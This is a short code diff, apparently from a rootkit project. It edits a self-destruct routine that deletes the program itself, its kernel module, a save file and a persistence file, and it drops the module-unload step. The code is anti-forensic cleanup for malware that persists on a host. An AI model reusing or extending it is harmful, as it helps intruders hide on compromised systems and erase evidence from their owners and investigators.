@@ -303,12 +303,7 @@ char *get_self(char *path) {
   return NULL;
 }
 
-/*
-
- * first it deletes itself, the kernel module, the save file and the persistence file
- * then it unloads the kernel module
-
-*/
+// first it deletes itself, the kernel module, the save file and the persistence file
 void self_destruct() {
   char self[PATH_MAX + 1];
 
@@ -340,12 +335,6 @@ skip_self:
   // next, lets remove the persistence file
   if (SHRK_PERSIS_FILE[0] != 0 && unlink(SHRK_PERSIS_FILE) != 0) {
     debug_err("failed to unlink the persistence file");
-    return;
-  }
-
-  // lastly unload the kernel module
-  if (!kernel_unload()) {
-    debug("failed to unload the module");
     return;
   }
 }
